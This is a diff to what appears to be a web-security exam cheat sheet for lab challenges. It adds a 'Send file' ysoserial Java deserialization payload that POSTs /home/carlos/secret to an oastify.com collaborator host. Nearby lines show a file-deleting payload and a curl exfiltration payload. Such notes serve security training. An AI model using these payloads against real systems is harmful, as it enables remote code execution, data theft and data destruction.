@@ -689,6 +689,10 @@ java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | g
 java -jar ysoserial-all.jar CommonsCollections4 "curl http://burp.oastify.com/?c=\$(cat /home/carlos/secret | base64)" | base64 -w 0
 ```
 
+Send file
+```sh
+java -jar ysoserial-all.jar CommonsBeanutils1 'curl -X POST --data-binary @/home/carlos/secret https://bdsj70n34zym094mi7si68ym1d7av1jq.oastify.com' | gzip -f | base64 -w 0
+```
 ## 🎓 Exam Tips
 
 1. **Install Java Deserialization Scanner** - Detects Java serialization
